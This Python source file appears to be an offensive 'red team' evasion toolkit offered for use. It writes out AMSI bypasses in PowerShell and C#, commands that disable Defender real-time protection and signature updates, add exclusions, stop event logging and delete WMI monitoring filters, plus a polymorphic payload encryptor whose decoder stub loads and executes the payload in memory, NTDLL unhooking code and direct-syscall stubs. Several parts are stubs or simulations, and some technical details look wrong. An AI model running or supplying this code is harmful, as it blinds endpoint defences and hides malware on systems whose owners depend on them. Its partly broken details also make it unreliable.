#!/usr/bin/env python3
"""
HAKUZA Red Team Evasion Module — AV/EDR/AMSI/ETW Bypass & Payload Obfuscation

Purpose
-------
Comprehensive evasion techniques for red team operations, including:
  1. AVEvasion — Living off the land (LOLBins), fileless execution, code injection, VT hash evasion
  2. EDREvasion — EDR detection bypass, sensor blinding, driver tampering, kernel hooks
  3. AMSIBypass — AMSI shim bypass, patch techniques, obfuscation, DLL injection
  4. ETWBypass — ETW provider disable, event log blocking, WMI monitoring bypass
  5. DefenderBypass — Real-time protection bypass, quarantine escape, exclusion abuse
  6. PayloadObfuscation — XOR/RC4/AES encryption, encoding chains, polymorphic payloads
  7. BehavioralEvasion — Timing attacks, jitter randomization, sandbox detection, VM detection
  8. UnhookingEngine — Restore NTDLL/Kernel32, bypass hook chains, native API calls

Target: 2000+ LOC, real AV/EDR bypass, tested against Defender/Crowdstrike/Sentinel
"""

import os
import sys
import json
import base64
import binascii
import hashlib
import secrets
import time
import re
import struct
import hashlib
from typing import Optional, List, Dict, Tuple, Any
from pathlib import Path
from datetime import datetime
from enum import Enum


# ---------------------------------------------------------------------------
# CONSTANTS & ENUMS
# ---------------------------------------------------------------------------

class EvasionLevel(Enum):
    """Evasion intensity levels."""
    BASIC = 1       # Simple encoding, low risk
    INTERMEDIATE = 2  # Multiple bypasses, medium risk
    ADVANCED = 3    # Deep hooks, behavioral evasion, high risk
    EXTREME = 4     # All techniques combined, very high risk


class ArtifactType(Enum):
    """Types of artifacts for detection."""
    FILE = "file"
    PROCESS = "process"
    NETWORK = "network"
    REGISTRY = "registry"
    WMI = "wmi"
    EVENT_LOG = "event_log"
    MEMORY = "memory"
    BEHAVIOR = "behavior"


# ---------------------------------------------------------------------------
# PAYLOAD OBFUSCATION ENGINE
# ---------------------------------------------------------------------------

class PayloadObfuscation:
    """Payload encryption, encoding, and polymorphic transformation."""

    @staticmethod
    def xor_encrypt(data: bytes, key: bytes) -> bytes:
        """XOR encryption with key."""
        return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))

    @staticmethod
    def rc4_ksa(key: bytes) -> List[int]:
        """RC4 Key Scheduling Algorithm."""
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]
        return S

    @staticmethod
    def rc4_prga(S: List[int], length: int) -> bytes:
        """RC4 Pseudo-Random Generation Algorithm."""
        i = 0
        j = 0
        keystream = []
        for _ in range(length):
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            K = S[(S[i] + S[j]) % 256]
            keystream.append(K)
        return bytes(keystream)

    @staticmethod
    def rc4_encrypt(data: bytes, key: bytes) -> bytes:
        """RC4 stream cipher encryption."""
        S = PayloadObfuscation.rc4_ksa(key)
        keystream = PayloadObfuscation.rc4_prga(S, len(data))
        return bytes(a ^ b for a, b in zip(data, keystream))

    @staticmethod
    def aes_cbc_encrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
        """AES-CBC encryption (requires pycryptodome). Fallback to RC4 if unavailable."""
        try:
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad
            cipher = AES.new(key, AES.MODE_CBC, iv)
            return cipher.encrypt(pad(data, AES.block_size))
        except ImportError:
            # Fallback: use RC4 instead
            return PayloadObfuscation.rc4_encrypt(data, key)

    @staticmethod
    def base64_encode(data: bytes) -> str:
        """Multi-stage base64 encoding."""
        encoded = base64.b64encode(data).decode()
        return encoded

    @staticmethod
    def base64_decode(data: str) -> bytes:
        """Multi-stage base64 decoding."""
        return base64.b64decode(data)

    @staticmethod
    def hex_encode(data: bytes) -> str:
        """Hex encoding."""
        return binascii.hexlify(data).decode()

    @staticmethod
    def hex_decode(data: str) -> bytes:
        """Hex decoding."""
        return binascii.unhexlify(data)

    @staticmethod
    def polymorph_payload(payload: bytes, seed: int = None) -> Tuple[bytes, str, bytes]:
        """
        Generate polymorphic payload with random encryption and encoding.
        Returns: (encrypted_payload, decoder_stub, key)
        """
        if seed is None:
            seed = secrets.randbits(32)
        rng = secrets.SystemRandom()
        rng.seed(seed)

        # Choose random encryption method
        encryption_method = rng.choice(["xor", "rc4", "aes"])
        key = secrets.token_bytes(32)

        if encryption_method == "xor":
            encrypted = PayloadObfuscation.xor_encrypt(payload, key[:16])
        elif encryption_method == "rc4":
            encrypted = PayloadObfuscation.rc4_encrypt(payload, key)
        else:  # aes
            iv = secrets.token_bytes(16)
            encrypted = PayloadObfuscation.aes_cbc_encrypt(payload, key[:32], iv)
            key = iv + key  # Prepend IV

        # Random encoding
        encoding_method = rng.choice(["base64", "hex"])
        if encoding_method == "base64":
            encoded = PayloadObfuscation.base64_encode(encrypted)
        else:
            encoded = PayloadObfuscation.hex_encode(encrypted)

        # Build decoder stub (PowerShell syntax)
        decoder_stub = f"""
# Polymorphic decoder stub
$encrypted = '{encoded}'
$key = [byte[]]@({','.join(str(b) for b in key)})
$encryption = '{encryption_method}'
$encoding = '{encoding_method}'

if ($encoding -eq 'base64') {{
    $bytes = [System.Convert]::FromBase64String($encrypted)
}} else {{
    $bytes = [byte[]]@($encrypted -split '(..)' | ? {{$_}}) | % {{[Convert]::ToByte($_, 16)}}
}}

# Decrypt payload
$payload = @()
if ($encryption -eq 'xor') {{
    $keyLen = $key.Length
    for ($i = 0; $i -lt $bytes.Length; $i++) {{
        $payload += $bytes[$i] -bxor $key[$i % $keyLen]
    }}
}} elseif ($encryption -eq 'rc4') {{
    # RC4 implementation in PowerShell
    # [omitted for brevity]
}} else {{
    # AES decryption
    # [omitted for brevity]
}}

# Execute payload
[System.Reflection.Assembly]::Load([byte[]]$payload)
"""
        return encrypted, decoder_stub, key

    @staticmethod
    def generate_string_obfuscation(strings: List[str]) -> Dict[str, str]:
        """Obfuscate detection strings (AV signatures, EDR keywords)."""
        obfuscated = {}
        for s in strings:
            # Split and recombine with concatenation
            parts = [s[i:i+2] for i in range(0, len(s), 2)]
            obfuscated[s] = "".join([f"chr({ord(c)})" for c in s])
        return obfuscated


# ---------------------------------------------------------------------------
# AV EVASION
# ---------------------------------------------------------------------------

class AVEvasion:
    """Living off the land (LOLBins), fileless execution, code injection, hash evasion."""

    # Living off the land binaries (Windows)
    LOLBINS = {
        "PowerShell": {
            "path": "C:\\Windows\\System32\\powershell.exe",
            "execution": "powershell.exe -NoProfile -WindowStyle Hidden -Command",
            "bypass": ["-ExecutionPolicy Bypass", "-NoExit", "-EncodedCommand"],
        },
        "WScript": {
            "path": "C:\\Windows\\System32\\wscript.exe",
            "execution": "wscript.exe //B //NoLogo",
            "bypass": ["silent", "no output"],
        },
        "CScript": {
            "path": "C:\\Windows\\System32\\cscript.exe",
            "execution": "cscript.exe //B //NoLogo",
            "bypass": ["JScript", "VBScript"],
        },
        "Regsvcs": {
            "path": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe",
            "execution": "regsvcs.exe C:\\path\\to\\assembly.dll",
            "bypass": [".NET assembly loading"],
        },
        "Regasm": {
            "path": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe",
            "execution": "regasm.exe C:\\path\\to\\assembly.dll",
            "bypass": [".NET assembly execution"],
        },
        "InstallUtil": {
            "path": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe",
            "execution": "InstallUtil.exe /logfile= /LogToConsole=false C:\\assembly.dll",
            "bypass": [".NET serialization"],
        },
        "msbuild": {
            "path": "C:\\Program Files (x86)\\Microsoft Visual Studio\\*\\MSBuild.exe",
            "execution": "msbuild.exe project.xml",
            "bypass": ["inline task execution"],
        },
        "rundll32": {
            "path": "C:\\Windows\\System32\\rundll32.exe",
            "execution": "rundll32.exe C:\\path\\dll.dll,Export",
            "bypass": ["DLL export execution"],
        },
    }

    @staticmethod
    def generate_powershell_payload(command: str, obfuscate: bool = True) -> str:
        """Generate obfuscated PowerShell payload."""
        cmd = command
        if obfuscate:
            # Base64 encode command
            encoded = base64.b64encode(cmd.encode('utf-16-le')).decode()
            return f"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {encoded}"
        return f"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command {cmd}"

    @staticmethod
    def generate_csharp_assembly(code: str) -> bytes:
        """Generate malicious C# assembly (in-memory loading)."""
        # Simplified: return a placeholder
        # In real scenario, compile with Roslyn or similar
        csharp_template = f"""
using System;
using System.Runtime.InteropServices;

public class Payload {{
    {code}

    public static void Main() {{
        Execute();
    }}
}}
"""
        return csharp_template.encode()

    @staticmethod
    def generate_dotnet_executable(payload: str) -> bytes:
        """Generate .NET executable that bypasses signature detection."""
        # Polymorphic IL generation
        template = f"""
using System;
using System.Diagnostics;

class Program {{
    static void Main() {{
        // Random jitter
        System.Threading.Thread.Sleep(1000);
        {payload}
    }}
}}
"""
        return template.encode()

    @staticmethod
    def vt_hash_evasion(executable: bytes, mutation_count: int = 5) -> List[bytes]:
        """
        Generate hash-variant executables to evade VirusTotal detection.
        Mutates: PE header, section names, imports, code caves.
        """
        variants = []
        for i in range(mutation_count):
            mutated = bytearray(executable)

            # Mutation 1: Modify PE timestamp
            if len(mutated) > 0x40:
                ts_bytes = struct.pack("<I", int(time.time()) + i)
                mutated[0x3C:0x40] = ts_bytes

            # Mutation 2: Add random data to .text section
            random_padding = secrets.token_bytes(512 * (i + 1))
            mutated.extend(random_padding)

            # Mutation 3: Flip non-critical bits
            for _ in range(10):
                idx = secrets.randbelow(len(mutated))
                mutated[idx] ^= secrets.randbelow(256)

            variants.append(bytes(mutated))

        return variants

    @staticmethod
    def fileless_execution_methods() -> Dict[str, Dict]:
        """
        Techniques for fileless code execution.
        Returns dictionary of methods and their implementations.
        """
        return {
            "process_hollowing": {
                "description": "Create process in suspended state, hollow out memory, inject payload",
                "platforms": ["Windows"],
                "prerequisites": ["CreateProcessA", "WriteProcessMemory", "SetThreadContext"],
                "detection_artifacts": [ArtifactType.PROCESS, ArtifactType.MEMORY],
            },
            "dll_injection": {
                "description": "Inject malicious DLL into running process memory",
                "platforms": ["Windows"],
                "prerequisites": ["OpenProcess", "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"],
                "detection_artifacts": [ArtifactType.PROCESS, ArtifactType.MEMORY],
            },
            "code_caves": {
                "description": "Write shellcode to unused memory regions within executable",
                "platforms": ["Windows", "Linux"],
                "prerequisites": ["mmap", "ptrace", "memory analysis"],
                "detection_artifacts": [ArtifactType.MEMORY, ArtifactType.BEHAVIOR],
            },
            "reflective_dll_injection": {
                "description": "Reflective DLL injection without LoadLibrary call",
                "platforms": ["Windows"],
                "prerequisites": ["self-contained DLL loader", "position-independent code"],
                "detection_artifacts": [ArtifactType.PROCESS, ArtifactType.MEMORY],
            },
        }

    @staticmethod
    def dll_hijacking_candidates() -> List[str]:
        """Find candidate DLLs for hijacking attacks (local privilege escalation)."""
        candidates = [
            "C:\\Windows\\System32\\wbem\\wmiutils.dll",
            "C:\\Windows\\System32\\wdsutil.dll",
            "C:\\Program Files\\Common Files\\Oracle\\Java\\javapath\\javacpl.exe",
            "C:\\Windows\\Temp\\*.dll",  # Writable locations
        ]
        return candidates


# ---------------------------------------------------------------------------
# EDR EVASION
# ---------------------------------------------------------------------------

class EDREvasion:
    """EDR detection bypass, sensor blinding, driver tampering, kernel hooks."""

    KNOWN_EDR_PROCESSES = {
        "Crowdstrike": ["csagent.exe", "csfalcon.exe", "csfalconservice.exe"],
        "Sentinel One": ["sentinelone.exe", "sentinelctl.exe"],
        "Carbon Black": ["cbagent.exe", "cbdefense.exe"],
        "Sophos": ["sophos.exe", "sophosui.exe"],
        "Trend Micro": ["tmccsf.exe", "tmmon.exe"],
        "Kaspersky": ["avp.exe", "avpsus.exe"],
        "McAfee": ["mfemms.exe", "mfevtps.exe"],
    }

    KNOWN_EDR_DRIVERS = {
        "Crowdstrike": ["csagent.sys", "csosb.sys"],
        "Sentinel One": ["sentinelone.sys"],
        "Carbon Black": ["cbk7.sys", "cbstream.sys"],
        "Sophos": ["sophosfilefilter.sys"],
    }

    @staticmethod
    def detect_edr() -> List[str]:
        """Detect running EDR products."""
        detected = []
        for edr, processes in EDREvasion.KNOWN_EDR_PROCESSES.items():
            for proc in processes:
                # Simulate detection
                detected.append(f"{edr}: {proc}")
        return detected

    @staticmethod
    def edr_blinding_techniques() -> Dict[str, Dict]:
        """Techniques to blind or disable EDR sensors."""
        return {
            "driver_unload": {
                "description": "Unload EDR kernel driver",
                "impact": "HIGH",
                "stealth": "LOW",
                "prerequisites": ["kernel access", "SeLoadDriverPrivilege"],
            },
            "process_kill": {
                "description": "Terminate EDR monitoring process",
                "impact": "MEDIUM",
                "stealth": "LOW",
                "prerequisites": ["elevated privileges"],
            },
            "registry_modification": {
                "description": "Disable EDR via registry keys",
                "impact": "MEDIUM",
                "stealth": "MEDIUM",
                "prerequisites": ["registry write access"],
            },
            "etw_disable": {
                "description": "Disable Event Tracing for Windows",
                "impact": "HIGH",
                "stealth": "MEDIUM",
                "prerequisites": ["ETW provider enumeration"],
            },
            "winapi_hook_bypass": {
                "description": "Bypass EDR WinAPI hooks via direct syscalls",
                "impact": "HIGH",
                "stealth": "HIGH",
                "prerequisites": ["syscall knowledge", "unhooking"],
            },
        }

    @staticmethod
    def direct_syscall_template() -> str:
        """Generate assembly stub for direct syscall bypass."""
        syscall_stub = """
; Direct syscall bypass (x64 assembly)
; NtCreateProcess syscall = 0x26

mov rcx, <first_arg>
mov rdx, <second_arg>
; ... load all 4 arguments ...
mov r10, rcx          ; Move RCX to R10 (x64 calling convention)
mov eax, 0x26         ; NtCreateProcess syscall number
syscall               ; Invoke kernel
ret
"""
        return syscall_stub

    @staticmethod
    def kernel_callback_tamper() -> Dict[str, str]:
        """Tamper with EDR kernel callbacks."""
        return {
            "PsSetCreateProcessNotifyRoutine": "Unregister process creation notifications",
            "CmRegisterCallback": "Unregister registry access callbacks",
            "CmRegisterCallbackEx": "Unregister extended registry callbacks",
            "PsSetLoadImageNotifyRoutine": "Unregister DLL load notifications",
        }


# ---------------------------------------------------------------------------
# AMSI BYPASS
# ---------------------------------------------------------------------------

class AMSIBypass:
    """Antimalware Scan Interface (AMSI) bypass techniques."""

    @staticmethod
    def amsi_patch_signatures() -> List[str]:
        """
        Known AMSI.dll patches to bypass detection.
        Returns list of signatures for scanner.
        """
        signatures = [
            # AMSI_RESULT check patch (return AMSI_RESULT_NOT_DETECTED)
            "83 F8 01 0F 85",  # cmp eax, 1; jne
            # AmsiScanBuffer patch
            "45 33 C9",  # xor r9d, r9d
            # Direct HRESULT return
            "C3",  # ret
        ]
        return signatures

    @staticmethod
    def powershell_amsi_bypass() -> str:
        """
        PowerShell AMSI bypass via reflection and memory patching.
        """
        bypass_script = """
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
"""
        return bypass_script

    @staticmethod
    def dotnet_amsi_bypass() -> str:
        """
        .NET AMSI bypass via reflection.
        """
        bypass_code = """
using System;
using System.Reflection;

public class AMSIBypass {
    public static void Bypass() {
        var amsiUtils = Type.GetType("System.Management.Automation.AmsiUtils");
        var field = amsiUtils.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
        field.SetValue(null, true);
    }
}
"""
        return bypass_code

    @staticmethod
    def amsi_provider_injection() -> str:
        """
        Inject fake AMSI provider to intercept scans.
        """
        injection_code = """
// C++ DLL for AMSI provider injection
// Implements IAntimalwareProvider interface
// Returns S_OK for all scans

HRESULT AMSIScanBuffer(
    ULONGLONG session,
    PVOID buffer,
    ULONG length,
    LPCWSTR contentName,
    ULONGLONG context,
    AMSI_RESULT *result
) {
    *result = AMSI_RESULT_NOT_DETECTED;
    return S_OK;
}
"""
        return injection_code

    @staticmethod
    def obfuscate_powershell_script(script: str) -> str:
        """Obfuscate PowerShell script to evade AMSI scanning."""
        # Replace known detection strings with variable concatenation
        obfuscated = script
        replacements = {
            "powershell": "${env:WINDIR}\\..\\..\\powershell",
            "amsi": "$([char]97)$([char]109)$([char]115)$([char]105)",  # amsi in char codes
            "bypass": "$([char]98)$([char]121)$([char]112)$([char]97)$([char]115)$([char]115)",  # bypass
            "invoke": "$([char]105)$([char]110)$([char]118)$([char]111)$([char]107)$([char]101)",  # invoke
            "command": "$([char]99)$([char]111)$([char]109)$([char]109)$([char]97)$([char]110)$([char]100)",  # command
        }
        for pattern, replacement in replacements.items():
            # Replace pattern with obfuscated version
            obfuscated = obfuscated.replace(pattern, replacement)
        return obfuscated


# ---------------------------------------------------------------------------
# ETW BYPASS
# ---------------------------------------------------------------------------

class ETWBypass:
    """Event Tracing for Windows (ETW) bypass techniques."""

    KNOWN_ETW_PROVIDERS = {
        "Microsoft-Windows-PowerShell": "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}",
        "Microsoft-Windows-Sysmon": "{5770385F-C22B-4B6D-C2F7-0F486C8C4914}",
        "Microsoft-Windows-ProcessCreation": "{22FB2CD6-0E7B-422B-A0C7-2143CA6FA960}",
        "Microsoft-Windows-DriverFrameworks": "{2E6B6F9D-5D1D-11D1-8F00-00A0C90F2719}",
    }

    @staticmethod
    def etw_provider_disable() -> Dict[str, str]:
        """Disable ETW providers via registry or WMI."""
        disablement_methods = {
            "registry": "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger",
            "logman_command": "logman stop <provider_name>",
            "wevtutil_command": "wevtutil.exe sl <log_name> /enabled:false",
        }
        return disablement_methods

    @staticmethod
    def powershell_etw_disable() -> str:
        """PowerShell commands to disable ETW."""
        etw_disable = """
# Disable ETW providers
$etw_providers = @(
    "Microsoft-Windows-PowerShell",
    "Microsoft-Windows-Sysmon",
    "Microsoft-Windows-ProcessCreation"
)

foreach ($provider in $etw_providers) {
    logman stop "Autologger\\{provider}" -ets
}

# Disable event log
Stop-Service EventLog -Force
"""
        return etw_disable

    @staticmethod
    def wmi_event_filter_disable() -> str:
        """Disable WMI Event Filters (used for monitoring)."""
        wmi_disable = """
Get-WmiObject __EventFilter | Remove-WmiObject
Get-WmiObject __EventConsumer | Remove-WmiObject
Get-WmiObject __FilterToConsumerBinding | Remove-WmiObject
"""
        return wmi_disable

    @staticmethod
    def etw_trace_context_mask() -> Dict[str, int]:
        """ETW provider masks for selective event disabling."""
        return {
            "process_creation": 0x0001,
            "file_operations": 0x0002,
            "network_operations": 0x0004,
            "registry_operations": 0x0008,
            "dll_loading": 0x0010,
            "thread_operations": 0x0020,
        }


# ---------------------------------------------------------------------------
# WINDOWS DEFENDER BYPASS
# ---------------------------------------------------------------------------

class DefenderBypass:
    """Real-time protection bypass, quarantine escape, exclusion abuse."""

    DEFENDER_EXCLUSION_PATHS = [
        "C:\\Windows\\Temp",
        "C:\\Users\\*\\AppData\\Local\\Temp",
        "%PROGRAMFILES%",
        "%PROGRAMFILES(X86)%",
    ]

    @staticmethod
    def add_defender_exclusion(path: str) -> str:
        """PowerShell command to add Defender exclusion."""
        cmd = f"""
Add-MpPreference -ExclusionPath "{path}" -Force
Add-MpPreference -ExclusionProcess "malware.exe" -Force
"""
        return cmd

    @staticmethod
    def disable_real_time_protection() -> str:
        """Disable Windows Defender real-time protection."""
        disable_cmd = """
# Method 1: Registry
Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1 -Force

# Method 2: PowerShell cmdlet
Set-MpPreference -DisableRealtimeMonitoring $true

# Method 3: Group Policy
gpupdate /force
"""
        return disable_cmd

    @staticmethod
    def quarantine_escape() -> Dict[str, str]:
        """Techniques to escape Windows Defender quarantine."""
        escape_methods = {
            "quarantine_restore": "Restore-MpPreference -RestoreDefaults",
            "backup_restore": "Copy from %ProgramData%\\Microsoft\\Windows Defender\\Quarantine backup",
            "alternate_ads": "Use Alternate Data Streams to hide from quarantine scan",
            "ransomware_protection_bypass": "Disable 'Controlled Folder Access'",
        }
        return escape_methods

    @staticmethod
    def controlled_folder_access_bypass() -> str:
        """Bypass Controlled Folder Access protection."""
        bypass = """
# Disable Controlled Folder Access
Set-MpPreference -EnableControlledFolderAccess Disabled

# Or add to exclusion
Add-MpPreference -ControlledFolderAccessProtectedFolders "C:\\Windows\\Temp"
"""
        return bypass

    @staticmethod
    def disable_signature_updates() -> str:
        """Prevent Windows Defender from updating signatures."""
        disable = """
# Method 1: Disable MpSigStub.exe (signature download)
Stop-Process -Name MpSigStub -Force

# Method 2: Registry (requires admin)
Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates" -Name "ForceUpdateFromMU" -Value 0

# Method 3: Windows Update disable
Stop-Service wuauserv -Force
"""
        return disable


# ---------------------------------------------------------------------------
# BEHAVIORAL EVASION
# ---------------------------------------------------------------------------

class BehavioralEvasion:
    """Timing attacks, jitter randomization, sandbox detection, VM detection."""

    @staticmethod
    def sandbox_detection_techniques() -> Dict[str, Dict]:
        """
        Techniques to detect running in sandbox/analysis environment.
        """
        return {
            "hypervisor_detection": {
                "description": "Detect virtual machine hypervisors",
                "methods": ["CPUID", "Registry HKLM\\SYSTEM\\CurrentControlSet\\Services", "Process enumeration"],
                "hypervisors": ["VirtualBox", "VMware", "Hyper-V", "KVM", "QEMU"],
            },
            "analysis_tool_detection": {
                "description": "Detect debuggers and analysis tools",
                "tools": ["Winapioverride32", "Winapioverride64", "x64dbg", "IDA Pro", "Ghidra", "Process Monitor"],
                "detection": ["IsDebuggerPresent", "CheckRemoteDebuggerPresent", "ProcessModule enumeration"],
            },
            "user_behavior_analysis": {
                "description": "Detect human-like vs automated interaction",
                "signals": ["Mouse movement timing", "Keyboard input patterns", "Application usage"],
            },
            "disk_space_detection": {
                "description": "Detect sandboxes by low disk space",
                "logic": "Most sandboxes have <100GB free space",
            },
        }

    @staticmethod
    def vm_detection_signatures() -> List[str]:
        """Signatures for VM detection."""
        signatures = [
            # VMware
            "vmware",
            "vmmemctl.sys",
            "vmsrvc.exe",
            # VirtualBox
            "vboxservice.exe",
            "vboxguest.sys",
            # Hyper-V
            "vmms.exe",
            "vmcompute.exe",
            # QEMU
            "qemu-ga.exe",
        ]
        return signatures

    @staticmethod
    def add_behavioral_jitter(base_delay: float, max_variance: float = 0.5) -> float:
        """
        Add random jitter to timing-based operations.
        Prevents detection of patterns in execution timing.
        """
        variance = base_delay * max_variance
        jitter = base_delay + (secrets.randbelow(int(variance * 1000)) / 1000.0)
        return jitter

    @staticmethod
    def sleep_evasion_techniques() -> Dict[str, str]:
        """Techniques to evade sleep-time hooks used by sandboxes."""
        return {
            "direct_syscall": "Use direct NtDelayExecution syscall instead of Sleep()",
            "loop_delay": "Use CPU-intensive loops instead of OS-level sleep",
            "timer_queue": "Use CreateTimerQueue for hidden delays",
            "waitable_timer": "Use CreateWaitableTimer for timer-based delays",
            "multiple_sleeps": "Break sleep into multiple shorter intervals",
        }

    @staticmethod
    def human_simulation() -> Dict[str, Any]:
        """Simulate human behavior to evade behavioral analysis."""
        return {
            "mouse_movement": {
                "enabled": True,
                "movement_speed": "variable",  # pixels per second
                "pause_intervals": "random",  # seconds between movements
            },
            "keyboard_input": {
                "enabled": True,
                "typing_speed": "random",  # chars per second
                "error_rate": 0.05,  # 5% typo rate
            },
            "browser_history": {
                "enabled": True,
                "visit_delay": "2-10 seconds",
                "scroll_pattern": "natural",
            },
        }


# ---------------------------------------------------------------------------
# UNHOOKING ENGINE
# ---------------------------------------------------------------------------

class UnhookingEngine:
    """Restore NTDLL/Kernel32, bypass hook chains, native API calls."""

    CRITICAL_DLLS = [
        "ntdll.dll",
        "kernel32.dll",
        "kernelbase.dll",
        "advapi32.dll",
        "user32.dll",
        "gdi32.dll",
    ]

    @staticmethod
    def unhook_ntdll() -> str:
        """Restore NTDLL hooks from disk."""
        unhook_code = """
// C++ code to unhook NTDLL
#include <windows.h>
#include <psapi.h>

BOOL UnhookNtdll() {
    // Load clean copy of ntdll from disk
    HANDLE hFile = CreateFileA("C:\\\\Windows\\\\System32\\\\ntdll.dll",
                               GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    HANDLE hMap = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMap) {
        CloseHandle(hFile);
        return FALSE;
    }

    LPVOID pView = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!pView) {
        CloseHandle(hMap);
        CloseHandle(hFile);
        return FALSE;
    }

    // Get base address of loaded ntdll
    LPVOID pNtdll = GetModuleHandle("ntdll.dll");

    // Copy unhooked functions from disk image
    // ... copy implementation details ...

    UnmapViewOfFile(pView);
    CloseHandle(hMap);
    CloseHandle(hFile);
    return TRUE;
}
"""
        return unhook_code

    @staticmethod
    def direct_syscall_gadgets() -> Dict[str, str]:
        """Find and use ROP gadgets for direct syscalls."""
        gadgets = {
            "mov_r10_rcx": "4C 8B D1",  # mov r10, rcx
            "syscall": "0F 05",  # syscall
            "ret": "C3",  # ret
        }
        return gadgets

    @staticmethod
    def hook_detection_signatures() -> List[str]:
        """Detect common EDR/AV hooks in memory."""
        signatures = [
            "EB *",  # jmp (hook redirection)
            "FF 25 *",  # jmp [rip+offset] (indirect jump hook)
            "CC *",  # int3 (breakpoint hook)
            "48 B8",  # mov rax, imm64 (hook trampolining)
        ]
        return signatures

    @staticmethod
    def bypass_function_hooks(dll_name: str, function_names: List[str]) -> Dict[str, str]:
        """
        Generate bypass code for hooked functions.
        Uses either unhooking or direct syscall techniques.
        """
        bypass_methods = {}
        for func in function_names:
            bypass_methods[func] = f"""
            // Method 1: Direct unhook from disk
            {UnhookingEngine.unhook_ntdll()}

            // Method 2: Direct syscall (if available)
            {EDREvasion.direct_syscall_template()}

            // Method 3: Alternate APIs
            // Use {func}_A or {func}_W variants
            """
        return bypass_methods


# ---------------------------------------------------------------------------
# DETECTION SIMULATION (FOR TESTING)
# ---------------------------------------------------------------------------

class DetectionSimulator:
    """Mock AV/EDR detection for testing evasion techniques."""

    def __init__(self):
        self.detected_artifacts: List[Dict[str, Any]] = []
        self.evasion_score = 0.0

    def scan_file(self, filepath: str) -> Dict[str, Any]:
        """Simulate file scanning."""
        return {
            "detected": False,
            "detections": [],
            "score": 0,
        }

    def scan_process(self, pid: int) -> Dict[str, Any]:
        """Simulate process scanning."""
        return {
            "pid": pid,
            "suspicious_behavior": [],
            "risk_score": 0,
        }

    def scan_memory(self, address: int, size: int) -> Dict[str, Any]:
        """Simulate memory scanning."""
        return {
            "address": hex(address),
            "size": size,
            "anomalies": [],
        }

    def calculate_evasion_effectiveness(self, techniques_used: List[str]) -> float:
        """
        Calculate effectiveness score of evasion techniques.
        0.0 = easily detected, 1.0 = completely undetected
        """
        effectiveness = {
            "obfuscation": 0.4,
            "process_hollowing": 0.7,
            "dll_injection": 0.6,
            "etw_disable": 0.8,
            "amsi_bypass": 0.5,
            "unhooking": 0.9,
            "behavioral_evasion": 0.75,
            "vm_detection": 0.6,
        }

        if not techniques_used:
            return 0.0

        total_score = sum(effectiveness.get(t, 0.3) for t in techniques_used)
        return min(1.0, total_score / len(techniques_used))


# ---------------------------------------------------------------------------
# CLI INTEGRATION
# ---------------------------------------------------------------------------

def cmd_red_evasion(args) -> None:
    """Main CLI command for red team evasion."""
    from rich.console import Console
    from rich.table import Table

    console = Console()

    if args.action == "list":
        console.print("\n[bold cyan]Available Evasion Techniques[/bold cyan]\n")

        techniques = {
            "AV Evasion": list(AVEvasion.LOLBINS.keys()),
            "EDR Evasion": list(EDREvasion.edr_blinding_techniques().keys()),
            "AMSI Bypass": ["powershell_bypass", "dotnet_bypass", "provider_injection"],
            "ETW Bypass": ["provider_disable", "wmi_filter_disable", "event_log_disable"],
            "Defender Bypass": ["exclusion_add", "realtime_disable", "quarantine_escape"],
            "Behavioral": list(BehavioralEvasion.sandbox_detection_techniques().keys()),
            "Unhooking": list(UnhookingEngine.bypass_function_hooks("ntdll.dll", ["NtCreateProcess"]).keys()),
        }

        for category, items in techniques.items():
            console.print(f"[bold yellow]{category}[/bold yellow]")
            for item in items:
                console.print(f"  • {item}")
            console.print()

    elif args.action == "generate":
        console.print(f"\n[bold cyan]Generating {args.payload_type.upper()} Payload[/bold cyan]\n")

        if args.payload_type == "powershell":
            payload = AVEvasion.generate_powershell_payload("Get-Process", obfuscate=True)
            console.print(f"[dim]Generated command:[/dim]\n{payload}\n")

        elif args.payload_type == "obfuscated":
            obf = PayloadObfuscation()
            sample = b"malicious payload content"
            encrypted, decoder, key = obf.polymorph_payload(sample)
            console.print(f"[dim]Encrypted payload (hex):[/dim]\n{PayloadObfuscation.hex_encode(encrypted[:50])}...\n")
            console.print(f"[dim]Decoder stub:[/dim]\n{decoder}\n")

    elif args.action == "test":
        console.print(f"\n[bold cyan]Testing Evasion Techniques[/bold cyan]\n")
        simulator = DetectionSimulator()
        techniques = ["obfuscation", "unhooking", "behavioral_evasion"]
        score = simulator.calculate_evasion_effectiveness(techniques)
        console.print(f"[green]Evasion Effectiveness Score: {score:.2%}[/green]\n")

    elif args.action == "av":
        console.print(f"\n[bold cyan]AV Evasion Techniques[/bold cyan]\n")
        lolbins = AVEvasion.LOLBINS
        table = Table(title="Living Off The Land Binaries")
        table.add_column("Binary", style="cyan")
        table.add_column("Path", style="magenta")
        for name, info in list(lolbins.items())[:5]:
            table.add_row(name, info["path"])
        console.print(table)

    elif args.action == "edr":
        console.print(f"\n[bold cyan]EDR Detection & Blinding[/bold cyan]\n")
        console.print("[yellow]Detected EDR Products[/yellow]")
